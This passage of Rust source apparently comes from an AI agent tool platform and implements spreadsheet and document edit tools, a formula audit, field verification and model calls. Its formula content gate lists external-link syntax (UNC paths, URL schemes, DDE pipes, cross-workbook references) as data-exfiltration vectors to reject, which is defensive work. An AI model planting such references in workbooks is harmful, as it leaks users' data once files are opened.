                    .and_then(|v| v.as_str())
                    .ok_or_else(|| {
                        ToolError::failed(
                            tool,
                            format!("op {}: text.replace needs args.text", op.op_id),
                        )
                    })?;
                ops.push(DocxOp::TextReplace {
                    index,
                    new_text: text.to_string(),
                });
            }
            other => {
                return Err(ToolError::failed(
                    tool,
                    format!(
                        "op {}: {} is not a DOCX operation",
                        op.op_id,
                        other.as_str()
                    ),
                ));
            }
        }
    }
    doc.apply(bytes, &ops)
        .map_err(|e| ToolError::failed(tool, e.to_string()))
}

fn apply_xlsx(tool: &str, bytes: &[u8], batch: &ArtifactBatch) -> Result<Vec<u8>, ToolError> {
    let mut wb = WorkbookDoc::load(bytes).map_err(|e| ToolError::failed(tool, e.to_string()))?;
    for op in &batch.operations {
        if op.kind != OpKind::CellSet {
            return Err(ToolError::failed(
                tool,
                format!(
                    "op {}: {} is not a workbook operation",
                    op.op_id,
                    op.kind.as_str()
                ),
            ));
        }
        let sheet = op
            .args
            .get("sheet_id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| {
                ToolError::failed(
                    tool,
                    format!("op {}: cell.set needs args.sheet_id", op.op_id),
                )
            })?;
        let address = op
            .args
            .get("address")
            .and_then(|v| v.as_str())
            .ok_or_else(|| {
                ToolError::failed(
                    tool,
                    format!("op {}: cell.set needs args.address", op.op_id),
                )
            })?;
        let (col, row) = parse_addr(address).ok_or_else(|| {
            ToolError::failed(tool, format!("op {}: bad address {address}", op.op_id))
        })?;
        // Precondition against the live cell.
        let current = wb
            .sheets_snapshot()
            .get(sheet)
            .ok_or_else(|| {
                ToolError::failed(tool, format!("op {}: sheet {sheet} not found", op.op_id))
            })?
            .cells
            .get(&(col, row));
        let current_hash = cell_content_hash(
            current.and_then(|c| c.formula.as_deref()),
            current.and_then(|c| c.cached.as_ref()),
        );
        if current_hash != op.precondition.expected_content_hash {
            return Err(ToolError::failed(
                tool,
                format!(
                    "op {}: {sheet}!{address} changed since it was read (precondition mismatch)",
                    op.op_id
                ),
            ));
        }
        let kind = op
            .args
            .get("value_kind")
            .and_then(|v| v.as_str())
            .unwrap_or("text");
        let value = op.args.get("value");
        let set = match kind {
            "formula" => {
                let f = value.and_then(|v| v.as_str()).unwrap_or("");
                let sheets = wb.sheet_names();
                check_formula_allowed(f, &sheets).map_err(|reason| {
                    ToolError::failed(tool, format!("op {}: formula refused: {reason}", op.op_id))
                })?;
                harbor_artifacts::workbook::CellSet::Formula(f.trim_start_matches('=').to_string())
            }
            "number_decimal" => {
                let n = match value {
                    Some(JsonValue::Int(i)) => *i as f64,
                    Some(JsonValue::Str(s)) => s.parse::<f64>().map_err(|_| {
                        ToolError::failed(tool, format!("op {}: bad number {s}", op.op_id))
                    })?,
                    _ => {
                        return Err(ToolError::failed(
                            tool,
                            format!("op {}: number_decimal needs a value", op.op_id),
                        ))
                    }
                };
                harbor_artifacts::workbook::CellSet::Value(CellValue::Number(n))
            }
            "boolean" => harbor_artifacts::workbook::CellSet::Value(CellValue::Bool(
                value.and_then(|v| v.as_bool()).unwrap_or(false),
            )),
            "blank" => harbor_artifacts::workbook::CellSet::Value(CellValue::Blank),
            _ => harbor_artifacts::workbook::CellSet::Value(CellValue::Text(
                value.and_then(|v| v.as_str()).unwrap_or("").to_string(),
            )),
        };
        wb.set_cell(sheet, row, col, set)
            .map_err(|e| ToolError::failed(tool, e.to_string()))?;
    }
    wb.to_bytes()
        .map_err(|e| ToolError::failed(tool, e.to_string()))
}

// ---------------------------------------------------------------------------
// artifact.propose_batch

pub struct ArtifactProposeBatch {
    spec: ToolSpec,
}

impl ArtifactProposeBatch {
    pub fn new() -> Self {
        ArtifactProposeBatch {
            spec: ToolSpec {
                id: "artifact.propose_batch".into(),
                description: "Validate a typed operation batch against the attached artifact's current content hashes and return the batch with the hash of the output it would produce. Nothing is written.".into(),
                args_schema: json!({
                    "type": "object",
                    "properties": {
                        "artifact_id": {"type": "string", "minLength": 1, "maxLength": 128},
                        "batch_id": {"type": "string", "minLength": 1, "maxLength": 128, "pattern": "^[A-Za-z0-9][A-Za-z0-9_.:-]*$"},
                        "operations": {
                            "type": "array",
                            "minItems": 1,
                            "maxItems": 10000,
                            "items": {
                                "type": "object",
                                "properties": {
                                    "op_id": {"type": "string", "minLength": 1, "maxLength": 128, "pattern": "^[A-Za-z0-9][A-Za-z0-9_.:-]*$"},
                                    "kind": {"enum": ["text.replace", "cell.set"]},
                                    "target_id": {"type": "string", "minLength": 1, "maxLength": 128},
                                    "expected_content_hash": {"type": "string", "pattern": "^[a-f0-9]{64}$"},
                                    "args": {"type": "object"},
                                    "reason": {"type": "string", "maxLength": 300}
                                },
                                "required": ["kind", "target_id", "expected_content_hash", "args"],
                                "additionalProperties": false
                            }
                        }
                    },
                    "required": ["artifact_id", "operations"],
                    "additionalProperties": false
                }),
                risk: RiskClass::Propose,
                requires: vec!["artifact.engine".into()],
                timeout_ms: 60_000,
                max_output_bytes: 8 * MB,
            },
        }
    }
}

impl Default for ArtifactProposeBatch {
    fn default() -> Self {
        Self::new()
    }
}

impl Tool for ArtifactProposeBatch {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }

    fn call(&self, ctx: &ToolContext<'_>, args: &Value) -> Result<Value, ToolError> {
        let tool = self.spec.id.clone();
        let (id, a) = artifact(ctx, &tool, args)?;
        let base_content_hash = harbor_canonical::sha256_hex(&a.bytes);
        let mut operations = Vec::new();
        let mut reasons = Vec::new();
        for (i, op) in args
            .get("operations")
            .and_then(Value::as_array)
            .cloned()
            .unwrap_or_default()
            .iter()
            .enumerate()
        {
            if let Some(r) = s(op, "reason") {
                reasons.push(json!({"op_id": s(op, "op_id").unwrap_or_else(|| format!("op-{}", i + 1)), "reason": r}));
            }
            let kind = match s(op, "kind").as_deref() {
                Some("text.replace") => OpKind::TextReplace,
                Some("cell.set") => OpKind::CellSet,
                other => {
                    return Err(ToolError::failed(
                        &tool,
                        format!("unsupported op kind {other:?}"),
                    ))
                }
            };
            let op_args = harbor_canonical::convert(op.get("args").cloned().unwrap_or(json!({})))
                .map_err(|e| {
                ToolError::failed(&tool, format!("op {}: args not canonical: {e}", i + 1))
            })?;
            operations.push(Operation {
                op_id: s(op, "op_id").unwrap_or_else(|| format!("op-{}", i + 1)),
                kind,
                precondition: Precondition {
                    target_id: s(op, "target_id").unwrap_or_default(),
                    expected_content_hash: s(op, "expected_content_hash").unwrap_or_default(),
                },
                args: op_args,
            });
        }
        let batch = ArtifactBatch {
            batch_id: s(args, "batch_id")
                .unwrap_or_else(|| default_batch_id(&base_content_hash, &operations)),
            artifact_id: id.clone(),
            base_version_id: format!("v-{}", &base_content_hash[..16]),
            base_content_hash: base_content_hash.clone(),
            operations,
        };
        batch
            .validate()
            .map_err(|e| ToolError::failed(&tool, e.to_string()))?;
        let proposed = match detect_kind(&a.bytes) {
            ArtifactKind::Docx => apply_docx(&tool, &a.bytes, &batch)?,
            ArtifactKind::Xlsx => apply_xlsx(&tool, &a.bytes, &batch)?,
            other => {
                return Err(ToolError::failed(
                    &tool,
                    format!(
                        "batches are supported for DOCX and XLSX, not {}",
                        other.as_str()
                    ),
                ))
            }
        };
        Ok(json!({
            "artifact_id": id,
            "base_content_hash": base_content_hash,
            "batch": batch_json(&batch),
            "canonical_args_hash": batch.canonical_hash(),
            "proposed_output_hash": harbor_canonical::sha256_hex(&proposed),
            "proposed_output_bytes": proposed.len(),
            "op_count": batch.operations.len(),
            "reasons": reasons,
        }))
    }
}

// ---------------------------------------------------------------------------
// formula.audit

/// Qualified function targets from `22_Formula_Coverage.json` (the
/// authority file is embedded so the tool cannot drift from it).
const FORMULA_COVERAGE_JSON: &str = include_str!("../../../../22_Formula_Coverage.json");

/// The deterministic content gate below the model for any formula that a
/// batch would write (security review, production plan C4): only functions
/// the pinned engine qualifies, no references outside this workbook.
/// `[Book]Sheet!A1`, `\\server\share`, `scheme://` and quoted sheet names
/// with path characters are external-link syntax (data exfiltration once
/// the file is opened elsewhere); a sheet name not in `known_sheets` is a
/// dangling or foreign reference. `known_sheets` empty skips the sheet
/// check (the caller had no workbook facts).
pub fn check_formula_allowed(formula: &str, known_sheets: &[String]) -> Result<(), String> {
    let body = formula.trim().trim_start_matches('=');
    if body.is_empty() {
        return Err("empty formula".into());
    }
    static FN_RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    static SHEET_RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    let fn_re = FN_RE
        .get_or_init(|| regex::Regex::new(r"([A-Za-z][A-Za-z0-9_.]*)\s*\(").expect("fn regex"));
    let sheet_re = SHEET_RE.get_or_init(|| {
        regex::Regex::new(r"'([^']+)'!|([A-Za-z_][A-Za-z0-9_.]*)!").expect("sheet regex")
    });
    // Strip string literals before scanning so quoted text cannot smuggle
    // or hide syntax; a literal is opaque data, not a reference.
    let mut stripped = String::with_capacity(body.len());
    let mut in_string = false;
    for ch in body.chars() {
        if ch == '"' {
            in_string = !in_string;
            continue;
        }
        if !in_string {
            stripped.push(ch);
        }
    }
    if in_string {
        return Err("unterminated string literal".into());
    }
    if stripped.contains('[') || stripped.contains(']') {
        return Err("references another workbook ([Book]Sheet!ref)".into());
    }
    if stripped.contains("\\\\") || stripped.contains("://") || stripped.contains('|') {
        return Err("references an external location (UNC path, URL or DDE)".into());
    }
    let qualified = qualified_functions();
    for cap in fn_re.captures_iter(&stripped) {
        let name = cap[1].to_ascii_uppercase();
        if !qualified.contains(&name) {
            return Err(format!("function {name} is not in the qualified set"));
        }
    }
    for cap in sheet_re.captures_iter(&stripped) {
        let sheet = cap
            .get(1)
            .or_else(|| cap.get(2))
            .map(|m| m.as_str())
            .unwrap_or("");
        if sheet.contains('/') || sheet.contains('\\') || sheet.contains(':') {
            return Err(format!(
                "sheet reference {sheet:?} looks like an external path"
            ));
        }
        if !known_sheets.is_empty() && !known_sheets.iter().any(|k| k == sheet) {
            return Err(format!("sheet {sheet:?} is not in this workbook"));
        }
    }
    Ok(())
}

pub fn qualified_functions() -> BTreeSet<String> {
    let v: Value = serde_json::from_str(FORMULA_COVERAGE_JSON).unwrap_or(Value::Null);
    let mut out = BTreeSet::new();
    if let Some(groups) = v.get("target_groups").and_then(Value::as_array) {
        for g in groups {
            // The operator/reference group names categories, not functions.
            if g.get("group").and_then(Value::as_str) == Some("arithmetic_reference") {
                continue;
            }
            if let Some(fns) = g.get("functions").and_then(Value::as_array) {
                for f in fns {
                    if let Some(name) = f.get("name").and_then(Value::as_str) {
                        out.insert(name.to_string());
                    }
                }
            }
        }
    }
    out
}

pub struct FormulaAudit {
    spec: ToolSpec,
    qualified: BTreeSet<String>,
    fn_re: regex::Regex,
    sheet_re: regex::Regex,
}

impl FormulaAudit {
    pub fn new() -> Self {
        FormulaAudit {
            spec: ToolSpec {
                id: "formula.audit".into(),
                description: "Two-tier formula audit of an attached workbook: static scan of cached errors, dangling sheet references and unqualified functions, then recalculation through the pinned engine on a private copy. Nothing is saved.".into(),
                args_schema: json!({
                    "type": "object",
                    "properties": {
                        "artifact_id": {"type": "string", "minLength": 1, "maxLength": 128},
                        "recalculate": {"type": "boolean"},
                        "max_findings": {"type": "integer", "minimum": 1, "maximum": 100000}
                    },
                    "required": ["artifact_id"],
                    "additionalProperties": false
                }),
                risk: RiskClass::Read,
                requires: vec!["artifact.engine".into(), "formula.qualified".into()],
                timeout_ms: 120_000,
                max_output_bytes: 8 * MB,
            },
            qualified: qualified_functions(),
            fn_re: regex::Regex::new(r"([A-Za-z][A-Za-z0-9_.]*)\s*\(").expect("fn regex"),
            sheet_re: regex::Regex::new(r"'([^']+)'!|([A-Za-z_][A-Za-z0-9_.]*)!").expect("sheet regex"),
        }
    }

    fn functions_in(&self, formula: &str) -> Vec<String> {
        self.fn_re
            .captures_iter(formula)
            .filter_map(|c| c.get(1).map(|m| m.as_str().to_ascii_uppercase()))
            .collect()
    }

    fn sheets_in(&self, formula: &str) -> Vec<String> {
        self.sheet_re
            .captures_iter(formula)
            .filter_map(|c| {
                c.get(1)
                    .or_else(|| c.get(2))
                    .map(|m| m.as_str().to_string())
            })
            .collect()
    }
}

impl Default for FormulaAudit {
    fn default() -> Self {
        Self::new()
    }
}

impl Tool for FormulaAudit {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }

    fn call(&self, ctx: &ToolContext<'_>, args: &Value) -> Result<Value, ToolError> {
        let tool = self.spec.id.clone();
        let (id, a) = artifact(ctx, &tool, args)?;
        if detect_kind(&a.bytes) != ArtifactKind::Xlsx {
            return Err(ToolError::failed(
                &tool,
                "formula.audit needs an XLSX artifact",
            ));
        }
        let recalculate = args
            .get("recalculate")
            .and_then(Value::as_bool)
            .unwrap_or(true);
        let max_findings = args
            .get("max_findings")
            .and_then(Value::as_u64)
            .unwrap_or(2000) as usize;
        let wb =
            WorkbookDoc::load(&a.bytes).map_err(|e| ToolError::failed(&tool, e.to_string()))?;
        let sheet_names: BTreeSet<String> = wb.sheet_names().into_iter().collect();

        let mut static_errors = Vec::new();
        let mut dangling = Vec::new();
        let mut unsupported = Vec::new();
        let mut counts: BTreeMap<String, u64> = BTreeMap::new();
        let mut formula_cells = 0u64;
        let mut unsupported_cells: BTreeSet<String> = BTreeSet::new();
        for (name, data) in wb.sheets_snapshot() {
            for ((c, r), cell) in &data.cells {
                ctx.check_alive(&tool)?;
                let address = addr(*c, *r);
                let target = cell_target_id(name, &address);
                if let Some(f) = &cell.formula {
                    formula_cells += 1;
                    let missing: Vec<String> = self
                        .sheets_in(f)
                        .into_iter()
                        .filter(|s| !sheet_names.contains(s))
                        .collect();
                    if !missing.is_empty() && dangling.len() < max_findings {
                        dangling.push(json!({"sheet": name, "address": address, "target_id": target, "formula": f, "missing_sheets": missing}));
                    }
                    let unq: Vec<String> = self
                        .functions_in(f)
                        .into_iter()
                        .filter(|fname| !self.qualified.contains(fname))
                        .collect();
                    if !unq.is_empty() {
                        unsupported_cells.insert(format!("{name}!{address}"));
                        if unsupported.len() < max_findings {
                            unsupported.push(json!({"sheet": name, "address": address, "target_id": target, "formula": f, "functions": unq}));
                        }
                    }
                }
                if let Some(CellValue::Error(e)) = &cell.cached {
                    *counts.entry(e.code().to_string()).or_default() += 1;
                    if static_errors.len() < max_findings {
                        static_errors.push(json!({
                            "sheet": name, "address": address, "target_id": target,
                            "code": e.code(), "formula": cell.formula,
                            "content_hash": cell_content_hash(cell.formula.as_deref(), cell.cached.as_ref()),
                        }));
                    }
                }
            }
        }

        let mut out = json!({
            "artifact_id": id,
            "content_hash": harbor_canonical::sha256_hex(&a.bytes),
            "engine": {
                "family": harbor_formula::engine::ENGINE.family,
                "version": harbor_formula::engine::ENGINE.version,
                "source_revision": harbor_formula::engine::ENGINE.source_revision,
                "integrity_sha256": harbor_formula::engine::ENGINE.integrity_sha256,
                "adapter_revision": harbor_formula::engine::ENGINE.adapter_revision,
            },
            "sheets": sheet_names.iter().cloned().collect::<Vec<_>>(),
            "formula_cells": formula_cells,
            "static": {
                "errors": static_errors,
                "counts_by_code": counts,
                "dangling_references": dangling,
            },
            "unsupported": unsupported,
            "recalculated": false,
        });

        if recalculate {
            ctx.check_alive(&tool)?;
            let mut copy =
                WorkbookDoc::load(&a.bytes).map_err(|e| ToolError::failed(&tool, e.to_string()))?;
            let results = copy
                .recalculate_all()
                .map_err(|e| ToolError::failed(&tool, e.to_string()))?;
            let mut after_errors = Vec::new();
            let mut after_counts: BTreeMap<String, u64> = BTreeMap::new();
            let mut verified = 0u64;
            let mut changed = Vec::new();
            for ((sheet, row, col), v) in &results {
                let address = addr(*col, *row);
                let key = format!("{sheet}!{address}");
                let cached = wb
                    .sheets_snapshot()
                    .get(sheet)
                    .and_then(|d| d.cells.get(&(*col, *row)))
                    .and_then(|c| c.cached.clone());
                match v {
                    CellValue::Error(e) => {
                        *after_counts.entry(e.code().to_string()).or_default() += 1;
                        if after_errors.len() < max_findings {
                            after_errors.push(json!({"sheet": sheet, "address": address, "target_id": cell_target_id(sheet, &address), "code": e.code()}));
                        }
                    }
                    _ => {
                        if !unsupported_cells.contains(&key) {
                            verified += 1;
                        }
                    }
                }
                if cached.as_ref() != Some(v) && changed.len() < max_findings {
                    changed.push(json!({
                        "sheet": sheet, "address": address,
                        "cached": cached.as_ref().map(cell_value_json),
                        "recalculated": cell_value_json(v),
                    }));
                }
            }
            out["recalculated"] = json!(true);
            out["after"] = json!({
                "errors": after_errors,
                "counts_by_code": after_counts,
                "verified_cells": verified,
                "changed_from_cached": changed,
            });
        }
        Ok(out)
    }
}

// ---------------------------------------------------------------------------
// formula.build_operations

/// Deterministic join between audit facts and model decisions: the model
/// only names an address and an action; this tool copies target ids and
/// content hashes from the audit, so a small model never has to reproduce
/// a 64-hex hash, and rejects "fixes" that are not fixes (unchanged
/// formula, unknown cell, missing formula).
pub struct FormulaBuildOperations {
    spec: ToolSpec,
}

impl FormulaBuildOperations {
    pub fn new() -> Self {
        FormulaBuildOperations {
            spec: ToolSpec {
                id: "formula.build_operations".into(),
                description: "Turn triage decisions (address + action) into typed cell.set operations by copying target ids and content hashes from a formula.audit result; rejects decisions for cells the audit did not report or whose formula is unchanged.".into(),
                args_schema: json!({
                    "type": "object",
                    "properties": {
                        "audit": {"type": "object"},
                        "decisions": {
                            "type": "array",
                            "maxItems": 500,
                            "items": {
                                "type": "object",
                                "properties": {
                                    "sheet": {"type": "string", "minLength": 1},
                                    "address": {"type": "string", "minLength": 2, "maxLength": 12},
                                    "action": {"enum": ["fix", "review"]},
                                    "formula": {"type": ["string", "null"], "maxLength": 1000},
                                    "reason": {"type": "string", "maxLength": 300},
                                    "options": {"type": "array", "items": {"type": "string", "maxLength": 200}, "maxItems": 5}
                                },
                                "required": ["sheet", "address", "action"],
                                "additionalProperties": false
                            }
                        }
                    },
                    "required": ["audit", "decisions"],
                    "additionalProperties": false
                }),
                risk: RiskClass::Read,
                requires: vec![],
                timeout_ms: 5_000,
                max_output_bytes: 4 * MB,
            },
        }
    }
}

impl Default for FormulaBuildOperations {
    fn default() -> Self {
        Self::new()
    }
}

impl Tool for FormulaBuildOperations {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }

    fn call(&self, _ctx: &ToolContext<'_>, args: &Value) -> Result<Value, ToolError> {
        let audit = &args["audit"];
        // Findings keyed by "Sheet!Address" → (target_id, content_hash,
        // current formula, verified suggested formula).
        let mut findings: BTreeMap<String, (String, String, Option<String>, Option<String>)> =
            BTreeMap::new();
        let mut collect = |arr: Option<&Vec<Value>>| {
            for f in arr.into_iter().flatten() {
                let (Some(sheet), Some(address)) = (s(f, "sheet"), s(f, "address")) else {
                    continue;
                };
                let key = format!("{sheet}!{address}");
                let target = s(f, "target_id").unwrap_or_else(|| cell_target_id(&sheet, &address));
                let hash = s(f, "content_hash");
                let formula = s(f, "formula");
                // Only a formula the tool verified through the engine may be
                // applied without the model spelling it out.
                let suggested = s(f, "suggested_formula").filter(|_| {
                    f.get("reproduces_value")
                        .and_then(Value::as_bool)
                        .unwrap_or(false)
                });
                let entry = findings.entry(key).or_insert((
                    target,
                    String::new(),
                    formula.clone(),
                    suggested.clone(),
                ));
                if let Some(h) = hash {
                    entry.1 = h;
                }
                if entry.2.is_none() {
                    entry.2 = formula;
                }
                if entry.3.is_none() {
                    entry.3 = suggested;
                }
            }
        };
        collect(audit.pointer("/static/errors").and_then(Value::as_array));
        collect(
            audit
                .pointer("/static/dangling_references")
                .and_then(Value::as_array),
        );
        collect(audit.pointer("/unsupported").and_then(Value::as_array));
        // workbook.conventions reports a flat `findings` array in the same
        // sheet/address/target_id/content_hash shape.
        collect(audit.pointer("/findings").and_then(Value::as_array));
        let known_sheets: Vec<String> = audit
            .get("sheets")
            .and_then(Value::as_array)
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str().or_else(|| v.get("name").and_then(Value::as_str)))
                    .map(str::to_string)
                    .collect()
            })
            .unwrap_or_default();
        let mut operations = Vec::new();
        let mut review = Vec::new();
        let mut rejected = Vec::new();
        for d in args["decisions"].as_array().cloned().unwrap_or_default() {
            let sheet = s(&d, "sheet").unwrap_or_default();
            let address = s(&d, "address").unwrap_or_default().to_ascii_uppercase();
            let key = format!("{sheet}!{address}");
            let Some((target_id, content_hash, original, suggested)) = findings.get(&key) else {
                rejected.push(json!({"address": key, "reason": "the audit reported no finding for this cell"}));
                continue;
            };
            match s(&d, "action").as_deref() {
                Some("review") => review.push(json!({
                    "sheet": sheet, "address": address, "target_id": target_id,
                    "reason": s(&d, "reason").unwrap_or_default(),
                    "options": d.get("options").cloned().unwrap_or(json!([])),
                })),
                Some("fix") => {
                    let Some(formula) = s(&d, "formula")
                        .map(|f| f.trim().to_string())
                        .filter(|f| !f.is_empty())
                        .or_else(|| suggested.clone())
                    else {
                        rejected.push(json!({"address": key, "reason": "fix without a formula and no verified suggestion for this cell"}));
                        continue;
                    };
                    let normalized = format!("={}", formula.trim_start_matches('='));
                    if original
                        .as_deref()
                        .map(|o| format!("={}", o.trim_start_matches('=')) == normalized)
                        .unwrap_or(false)
                    {
                        rejected.push(
                            json!({"address": key, "reason": "formula is unchanged; not a fix"}),
                        );
                        continue;
                    }
                    // A model may spell a formula (formula-audit's triage);
                    // the content gate keeps it inside the qualified set and
                    // this workbook whatever the model was told.
                    if let Err(reason) = check_formula_allowed(&normalized, &known_sheets) {
                        rejected
                            .push(json!({"address": key, "reason": format!("refused: {reason}")}));
                        continue;
                    }
                    if content_hash.is_empty() {
                        rejected.push(json!({"address": key, "reason": "no content hash recorded for this finding"}));
                        continue;
                    }
                    operations.push(json!({
                        "kind": "cell.set",
                        "target_id": target_id,
                        "expected_content_hash": content_hash,
                        "args": {"sheet_id": sheet, "address": address, "value": normalized, "value_kind": "formula"},
                        "reason": s(&d, "reason").unwrap_or_default(),
                    }));
                }
                _ => rejected.push(json!({"address": key, "reason": "unknown action"})),
            }
        }
        Ok(json!({"operations": operations, "review": review, "rejected": rejected}))
    }
}

// ---------------------------------------------------------------------------
// text.verify_fields

/// Model proposes, tool verifies: string fields that do not occur verbatim
/// in the source text are set to null and reported. Used for owners and
/// dates in minutes so a small model's normalizations never survive.
pub struct TextVerifyFields {
    spec: ToolSpec,
}

impl TextVerifyFields {
    pub fn new() -> Self {
        TextVerifyFields {
            spec: ToolSpec {
                id: "text.verify_fields".into(),
                description: "Null out string fields of an item that do not occur verbatim in the source text; returns the verified item and the dropped fields.".into(),
                args_schema: json!({
                    "type": "object",
                    "properties": {
                        "source": {"type": "string", "maxLength": 2000000},
                        "item": {"type": "object"},
                        "fields": {"type": "array", "minItems": 1, "maxItems": 32, "items": {"type": "string", "minLength": 1}}
                    },
                    "required": ["source", "item", "fields"],
                    "additionalProperties": false
                }),
                risk: RiskClass::Read,
                requires: vec![],
                timeout_ms: 5_000,
                max_output_bytes: MB,
            },
        }
    }
}

impl Default for TextVerifyFields {
    fn default() -> Self {
        Self::new()
    }
}

impl Tool for TextVerifyFields {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }

    fn call(&self, _ctx: &ToolContext<'_>, args: &Value) -> Result<Value, ToolError> {
        let source = s(args, "source").unwrap_or_default();
        let mut item = args["item"].clone();
        let mut dropped = Vec::new();
        for f in args["fields"].as_array().cloned().unwrap_or_default() {
            let Some(name) = f.as_str() else { continue };
            if let Some(Value::String(v)) = item.get(name).cloned() {
                if !source.contains(v.as_str()) {
                    dropped.push(json!({"field": name, "value": v}));
                    if let Some(obj) = item.as_object_mut() {
                        obj.insert(name.to_string(), Value::Null);
                    }
                }
            }
        }
        Ok(json!({"item": item, "dropped": dropped}))
    }
}

// ---------------------------------------------------------------------------
// text.detect_language

/// Script-based language detection (Arabic vs Latin script share). Honest
/// scope: it distinguishes Arabic-script text from Latin-script text and
/// reports "und" otherwise; it is not a general language identifier.
pub struct TextDetectLanguage {
    spec: ToolSpec,
}

impl TextDetectLanguage {
    pub fn new() -> Self {
        TextDetectLanguage {
            spec: ToolSpec {
                id: "text.detect_language".into(),
                description: "Detect Arabic (ar) versus Latin-script (en) text by script share; reports und when neither dominates.".into(),
                args_schema: json!({
                    "type": "object",
                    "properties": {"text": {"type": "string", "minLength": 1, "maxLength": 2000000}},
                    "required": ["text"],
                    "additionalProperties": false
                }),
                risk: RiskClass::Read,
                requires: vec![],
                timeout_ms: 5_000,
                max_output_bytes: 4096,
            },
        }
    }
}

impl Default for TextDetectLanguage {
    fn default() -> Self {
        Self::new()
    }
}

impl Tool for TextDetectLanguage {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }

    fn call(&self, _ctx: &ToolContext<'_>, args: &Value) -> Result<Value, ToolError> {
        let text = s(args, "text").unwrap_or_default();
        let mut arabic = 0usize;
        let mut latin = 0usize;
        for ch in text.chars() {
            let cp = ch as u32;
            if (0x0600..=0x06FF).contains(&cp)
                || (0x0750..=0x077F).contains(&cp)
                || (0xFB50..=0xFDFF).contains(&cp)
                || (0xFE70..=0xFEFF).contains(&cp)
            {
                arabic += 1;
            } else if ch.is_ascii_alphabetic() || (0x00C0..=0x024F).contains(&cp) {
                latin += 1;
            }
        }
        let letters = (arabic + latin).max(1) as f64;
        let ar = arabic as f64 / letters;
        let la = latin as f64 / letters;
        let code = if arabic + latin == 0 {
            "und"
        } else if ar >= 0.6 {
            "ar"
        } else if la >= 0.6 {
            "en"
        } else {
            "und"
        };
        Ok(json!({"code": code, "arabic_ratio": ar, "latin_ratio": la, "method": "script"}))
    }
}

// ---------------------------------------------------------------------------
// model.ask / model.embed

pub struct ModelAsk {
    spec: ToolSpec,
}

impl ModelAsk {
    pub fn new() -> Self {
        ModelAsk {
            spec: ToolSpec {
                id: "model.ask".into(),
                description: "Ask the run's model a free-text question (prose skills). Graph skills prefer typed model nodes.".into(),
                args_schema: json!({
                    "type": "object",
                    "properties": {
                        "prompt": {"type": "string", "minLength": 1, "maxLength": 200000},
                        "system": {"type": "string", "maxLength": 20000},
                        "max_tokens": {"type": "integer", "minimum": 1, "maximum": 32768}
                    },
                    "required": ["prompt"],
                    "additionalProperties": false
                }),
                risk: RiskClass::Read,
                requires: vec![],
                timeout_ms: 600_000,
                max_output_bytes: 2 * MB,
            },
        }
    }
}

impl Default for ModelAsk {
    fn default() -> Self {
        Self::new()
    }
}

impl Tool for ModelAsk {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }

    fn call(&self, ctx: &ToolContext<'_>, args: &Value) -> Result<Value, ToolError> {
        let tool = &self.spec.id;
        let provider = ctx.provider.ok_or_else(|| {
            ToolError::Unavailable(tool.clone(), "no model provider bound to this run".into())
        })?;
        let model = ctx.model.clone().ok_or_else(|| {
            ToolError::Unavailable(tool.clone(), "no model bound to this run".into())
        })?;
        let mut messages = Vec::new();
        if let Some(sys) = s(args, "system") {
            messages.push(JsonValue::object([
                ("role", JsonValue::str("system")),
                ("content", JsonValue::str(sys)),
            ]));
        }
        messages.push(JsonValue::object([
            ("role", JsonValue::str("user")),
            (
                "content",
                JsonValue::str(s(args, "prompt").unwrap_or_default()),
            ),
        ]));
        let resp = provider
            .generate(ChatRequest {
                model,
                messages,
                max_tokens: args
                    .get("max_tokens")
                    .and_then(Value::as_u64)
                    .unwrap_or(512) as u32,
                temperature: 0.0,
                requires: vec![Capabilities::Chat],
                response_schema: None,
                trace_key: ctx.trace_key.clone(),
            })
            .map_err(|e| ToolError::failed(tool, e.to_string()))?;
        Ok(json!({
            "answer": resp.content,
            "executed_on": resp.executed_on,
            "execution_location": resp.execution_location.as_str(),
            "usage": {"prompt_tokens": resp.usage.prompt_tokens, "completion_tokens": resp.usage.completion_tokens},
        }))
    }
}

pub struct ModelEmbed {
    spec: ToolSpec,
}

impl ModelEmbed {
    pub fn new() -> Self {
        ModelEmbed {
            spec: ToolSpec {
                id: "model.embed".into(),
                description: "Embed up to 32 texts with the run's embedding model; returns vectors and the dimension (index identity binds the model).".into(),
                args_schema: json!({
                    "type": "object",
                    "properties": {
                        "texts": {"type": "array", "minItems": 1, "maxItems": 32, "items": {"type": "string", "minLength": 1, "maxLength": 20000}}
                    },
                    "required": ["texts"],
                    "additionalProperties": false
                }),
                risk: RiskClass::Read,
                requires: vec![],
                timeout_ms: 120_000,
                max_output_bytes: 8 * MB,
            },
        }
    }
}

impl Default for ModelEmbed {
    fn default() -> Self {
        Self::new()
    }
}

impl Tool for ModelEmbed {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }

    fn call(&self, ctx: &ToolContext<'_>, args: &Value) -> Result<Value, ToolError> {
        let tool = &self.spec.id;
        let provider = ctx.provider.ok_or_else(|| {
            ToolError::Unavailable(tool.clone(), "no model provider bound to this run".into())
        })?;
        let model = ctx.model.clone().ok_or_else(|| {
            ToolError::Unavailable(tool.clone(), "no model bound to this run".into())
        })?;
        let texts: Vec<String> = args
            .get("texts")
            .and_then(Value::as_array)
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        let vectors = provider
            .embed(&model, &texts)
            .map_err(|e| ToolError::failed(tool, e.to_string()))?;
        let dim = vectors.first().map(|v| v.len()).unwrap_or(0);
        Ok(json!({"count": vectors.len(), "dimension": dim, "vectors": vectors}))
    }
}

// ---------------------------------------------------------------------------
// clipboard.read

pub struct ClipboardRead {
    spec: ToolSpec,
}

impl ClipboardRead {
    pub fn new() -> Self {
        ClipboardRead {
            spec: ToolSpec {
                id: "clipboard.read".into(),
                description: "Read clipboard text the user explicitly attached to this run (SEC-020: never read silently).".into(),
                args_schema: json!({"type": "object", "properties": {}, "additionalProperties": false}),
                risk: RiskClass::Read,
                requires: vec![],
                timeout_ms: 1_000,
                max_output_bytes: 4 * MB,
            },
        }
    }
}

impl Default for ClipboardRead {
    fn default() -> Self {
        Self::new()
    }
